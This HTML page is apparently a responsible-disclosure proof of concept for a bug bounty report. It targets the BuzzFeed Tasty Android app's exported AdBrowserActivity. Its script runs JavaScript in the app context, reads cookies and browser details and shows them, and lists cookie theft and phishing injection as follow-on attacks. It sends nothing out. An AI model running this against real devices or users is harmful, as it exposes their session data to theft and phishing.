<!DOCTYPE html>
<html>
<head>
    <title>BuzzFeed Tasty Security PoC</title>
    <meta charset="UTF-8">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            min-height: 100vh;
        }
        .container {
            background: white;
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            margin-top: 20px;
        }
        h1 {
            color: #e62117; /* BuzzFeed red */
            text-align: center;
            margin-bottom: 10px;
        }
        .subtitle {
            text-align: center;
            color: #666;
            margin-bottom: 30px;
        }
        .alert-box {
            background: #ffebee;
            border: 2px solid #ffcdd2;
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
            text-align: center;
        }
        .vuln-details {
            background: #e3f2fd;
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
            border-left: 5px solid #2196f3;
        }
        pre {
            background: #f5f5f5;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            font-family: 'Courier New', monospace;
        }
        .status {
            padding: 10px;
            background: #e8f5e9;
            border-radius: 5px;
            margin: 10px 0;
            border-left: 4px solid #4caf50;
        }
        .footer {
            text-align: center;
            margin-top: 30px;
            color: #888;
            font-size: 0.9em;
            border-top: 1px solid #eee;
            padding-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>ðŸ”“ BuzzFeed Tasty Security Vulnerability Proof-of-Concept</h1>
        <p class="subtitle">Exported AdBrowserActivity allows arbitrary JavaScript execution</p>
        
        <div class="alert-box" id="alertTriggered">
            <h2>ðŸš¨ VULNERABILITY CONFIRMED</h2>
            <p>If you see an alert, JavaScript is executing in BuzzFeed Tasty app context.</p>
            <p><strong>Impact:</strong> Any app on device can run code in BuzzFeed's context.</p>
        </div>
        
        <div class="vuln-details">
            <h3>ðŸ“‹ Vulnerability Details</h3>
            <p><strong>Component:</strong> <code>org.prebid.mobile.rendering.views.browser.AdBrowserActivity</code></p>
            <p><strong>Package:</strong> <code>com.buzzfeed.tasty</code></p>
            <p><strong>Issue:</strong> Activity exported without permission protection</p>
            <p><strong>Manifest Entry:</strong></p>
            <pre>&lt;activity
    android:name="org.prebid.mobile.rendering.views.browser.AdBrowserActivity"
    android:exported="true"  &lt;!-- VULNERABLE --&gt;
    android:launchMode="singleTop"
    android:configChanges="screenSize|orientation|keyboardHidden"/&gt;</pre>
        </div>
        
        <div id="dataDemo" style="display: none;">
            <h3>ðŸ“Š Data Access Demonstration</h3>
            <div class="status" id="dataStatus"></div>
            <pre id="collectedData"></pre>
            <p><em>Note: In a real attack, this data could be exfiltrated to attacker server.</em></p>
        </div>
        
        <div class="footer">
            <p><strong>This is a security demonstration for responsible disclosure purposes only.</strong></p>
            <p>Vulnerability ID: CWE-926 | CVSS: 7.5-8.0 (High)</p>
            <p>Generated for HackerOne bug bounty program</p>
        </div>
    </div>

    <script>
        // Store exploit results
        const exploitResults = {
            timestamp: new Date().toISOString(),
            vulnerability: 'AdBrowserActivity exported without protection',
            confirmed: false,
            data: {}
        };
        
        // 1. Primary Confirmation - Show alert
        console.log('[BuzzFeed PoC] Starting exploit...');
        alert(
            "ðŸš¨ BuzzFeed Tasty Security Vulnerability Confirmed\n\n" +
            "JavaScript is executing in the BuzzFeed Tasty app context.\n\n" +
            "Vulnerability: Exported AdBrowserActivity allows any app to:\n" +
            "â€¢ Run arbitrary JavaScript\n" +
            "â€¢ Access app cookies and data\n" +
            "â€¢ Modify UI for phishing\n\n" +
            "CWE-926: Improper Export of Android Application Components"
        );
        
        exploitResults.confirmed = true;
        document.getElementById('alertTriggered').innerHTML += 
            '<div class="status">âœ“ Alert executed successfully at ' + new Date().toLocaleTimeString() + '</div>';
        
        // 2. Collect and display accessible data
        setTimeout(() => {
            const data = {
                url: window.location.href,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                cookies: document.cookie || 'No cookies present',
                localStorageItems: Object.keys(localStorage).length,
                screenResolution: `${screen.width}Ã—${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString()
            };
            
            exploitResults.data = data;
            
            // Show data collection section
            document.getElementById('dataDemo').style.display = 'block';
            document.getElementById('dataStatus').textContent = 
                'Collected ' + Object.keys(data).length + ' data points';
            document.getElementById('collectedData').textContent = 
                JSON.stringify(data, null, 2);
            
            console.log('[BuzzFeed PoC] Collected data:', data);
            
            // 3. Demonstrate attack simulation
            setTimeout(() => {
                // Simulate what an attacker COULD do (but don't actually do it)
                const simulatedAttack = {
                    type: 'simulated_exfiltration',
                    target: 'BuzzFeed Tasty',
                    data_size: JSON.stringify(data).length,
                    possible_actions: [
                        'Steal authentication cookies',
                        'Access localStorage data',
                        'Inject phishing UI',
                        'Trigger internal broadcasts'
                    ]
                };
                
                console.log('[BuzzFeed PoC] Attack simulation:', simulatedAttack);
                
                // Add simulation note
                const note = document.createElement('div');
                note.className = 'status';
                note.innerHTML = `
                    <strong>Attack Simulation Logged:</strong><br>
                    ${simulatedAttack.possible_actions.length} possible attack vectors identified
                `;
                document.getElementById('dataDemo').appendChild(note);
                
            }, 1000);
            
        }, 1500);
        
        // Log everything
        console.log('[BuzzFeed PoC] Exploit completed successfully');
        console.log('[BuzzFeed PoC] Full results:', exploitResults);
        
        // Make results available for debugging
        window.buzzfeedExploitResults = exploitResults;
    </script>
</body>
</html>
